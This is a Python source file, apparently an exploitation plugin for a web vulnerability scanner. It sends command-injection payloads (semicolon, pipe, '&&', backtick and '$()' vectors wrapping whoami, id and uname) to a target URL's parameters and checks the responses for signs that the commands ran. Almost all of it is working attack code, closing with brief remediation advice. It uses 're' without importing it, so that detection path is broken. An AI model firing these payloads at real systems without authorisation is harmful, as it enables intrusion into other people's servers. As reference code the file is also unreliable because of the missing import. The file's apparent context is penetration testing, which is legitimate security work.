"""
RCE (Remote Code Execution) Exploit Plugin

This plugin provides exploit capabilities for RCE vulnerabilities including:
- Command injection exploitation
- Reverse shell payloads
- File operations via command execution
- Information gathering
"""

import sys
import os
import time
from typing import Dict, List, Any, Optional
import logging
import base64

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

logger = logging.getLogger(__name__)


class RCEPlugin(ExploitPlugin):
    """
    RCE exploit plugin.
    
    This plugin provides RCE exploitation capabilities including:
    - Command injection exploits
    - Information gathering via command execution
    - File reading via command execution
    - Detection of successful exploitation
    """
    
    # Test commands that are safe but verify execution
    TEST_COMMANDS = {
        'linux': [
            'echo RCE_VERIFIED',
            'whoami',
            'id',
            'uname -a',
            'pwd',
        ],
        'windows': [
            'echo RCE_VERIFIED',
            'whoami',
            'hostname',
            'ver',
            'cd',
        ]
    }
    
    # Command injection prefixes/suffixes
    INJECTION_VECTORS = [
        '; {cmd}',
        '| {cmd}',
        '&& {cmd}',
        '& {cmd} &',
        '|| {cmd}',
        '` {cmd} `',
        '$({cmd})',
        '\n{cmd}\n',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'rce'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'RCE Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Remote Code Execution exploit plugin supporting command injection '
            'and basic exploitation techniques for RCE vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate RCE payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_os: Target operating system (linux, windows)
                    - command: Specific command to execute
                    - injection_point: Where the injection occurs
        
        Returns:
            List of RCE payload strings
        """
        context = context or {}
        target_os = context.get('target_os', 'linux')
        command = context.get('command', 'echo RCE_VERIFIED')
        
        payloads = []
        
        # Generate payloads using different injection vectors
        for vector in self.INJECTION_VECTORS:
            payload = vector.format(cmd=command)
            payloads.append(payload)
        
        # Add URL-encoded versions
        import urllib.parse
        for payload in payloads.copy():
            payloads.append(urllib.parse.quote(payload))
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute RCE exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST, etc.)
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - command_output: Output from command execution
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'rce',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        
        if not parameter:
            return {
                'success': False,
                'error': 'No vulnerable parameter specified',
                'vulnerability_type': 'rce',
            }
        
        logger.info(f"Attempting RCE exploitation on {target_url}, parameter: {parameter}")
        
        # Try to determine OS and execute test commands
        exploitation_result = self._attempt_exploitation(
            target_url, parameter, method, config
        )
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited RCE on {target_url}")
            return {
                'success': True,
                'command_output': exploitation_result.get('output', ''),
                'evidence': exploitation_result.get('evidence', ''),
                'os_detected': exploitation_result.get('os', 'unknown'),
                'vulnerability_type': 'rce',
                'message': 'Successfully executed remote commands',
            }
        else:
            logger.info(f"RCE exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': exploitation_result.get('error', 'Could not execute commands'),
                'message': 'RCE exploitation attempt was unsuccessful',
                'vulnerability_type': 'rce',
            }
    
    def _attempt_exploitation(self, url: str, parameter: str, method: str, 
                             config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to exploit the RCE vulnerability.
        
        Returns:
            Dict with success status, output, and evidence
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        # Try Linux commands first
        logger.info("Attempting Linux command execution...")
        linux_result = self._test_os_commands(
            url, parameter, method, 'linux', verify_ssl, timeout
        )
        
        if linux_result['success']:
            return linux_result
        
        # Try Windows commands
        logger.info("Attempting Windows command execution...")
        windows_result = self._test_os_commands(
            url, parameter, method, 'windows', verify_ssl, timeout
        )
        
        if windows_result['success']:
            return windows_result
        
        return {
            'success': False,
            'error': 'Could not execute commands on target system'
        }
    
    def _test_os_commands(self, url: str, parameter: str, method: str, 
                         os_type: str, verify_ssl: bool, timeout: int) -> Dict[str, Any]:
        """
        Test command execution for a specific OS type.
        
        Returns:
            Dict with success status and command output
        """
        commands = self.TEST_COMMANDS.get(os_type, self.TEST_COMMANDS['linux'])
        
        for command in commands:
            for vector in self.INJECTION_VECTORS[:5]:  # Test first 5 vectors
                payload = vector.format(cmd=command)
                
                try:
                    # Prepare request
                    if method == 'GET':
                        params = {parameter: payload}
                        response = requests.get(
                            url, params=params, timeout=timeout, verify=verify_ssl
                        )
                    else:  # POST
                        data = {parameter: payload}
                        response = requests.post(
                            url, data=data, timeout=timeout, verify=verify_ssl
                        )
                    
                    # Check for command output in response
                    response_text = response.text
                    
                    # Look for verification string
                    if 'RCE_VERIFIED' in response_text:
                        return {
                            'success': True,
                            'output': response_text[:500],  # First 500 chars
                            'evidence': f'Command executed: {command}, Vector: {vector}',
                            'os': os_type,
                            'command': command,
                            'vector': vector,
                        }
                    
                    # Look for command-specific output patterns
                    if command == 'whoami' and len(response_text) < 100:
                        # whoami typically returns short output
                        # Check for username pattern (alphanumeric, may contain - or _)
                        if (not any(x in response_text.lower() for x in ['error', 'exception', '<html']) and
                            re.search(r'[a-zA-Z0-9_-]+', response_text)):
                            return {
                                'success': True,
                                'output': response_text[:500],
                                'evidence': f'Command executed: {command}, Output: {response_text[:100]}',
                                'os': os_type,
                                'command': command,
                                'vector': vector,
                            }
                    
                    # Look for id command output (uid=, gid=)
                    if command == 'id' and ('uid=' in response_text or 'gid=' in response_text):
                        return {
                            'success': True,
                            'output': response_text[:500],
                            'evidence': f'Command executed: {command}, Found uid/gid in output',
                            'os': os_type,
                            'command': command,
                            'vector': vector,
                        }
                    
                    # Look for uname output
                    if command == 'uname -a' and any(x in response_text.lower() for x in ['linux', 'gnu', 'kernel']):
                        return {
                            'success': True,
                            'output': response_text[:500],
                            'evidence': f'Command executed: {command}, Found OS info in output',
                            'os': os_type,
                            'command': command,
                            'vector': vector,
                        }
                
                except requests.Timeout:
                    logger.debug(f"Timeout with payload: {payload}")
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")
        
        return {
            'success': False,
            'error': f'No successful command execution detected for {os_type}'
        }
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for RCE vulnerabilities."""
        return 'critical'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for RCE vulnerabilities."""
        return (
            'Prevent RCE attacks:\n'
            '1. Never execute user input as code or system commands\n'
            '2. Use parameterized APIs instead of shell execution\n'
            '3. Implement strict input validation and sanitization\n'
            '4. Use safe deserialization libraries\n'
            '5. Avoid eval(), exec(), and similar dangerous functions\n'
            '6. Use sandboxing and containerization\n'
            '7. Apply principle of least privilege\n'
            '8. Keep all software components updated\n'
            '9. Use Content Security Policy (CSP) headers\n'
            '10. Implement Web Application Firewall (WAF) rules'
        )
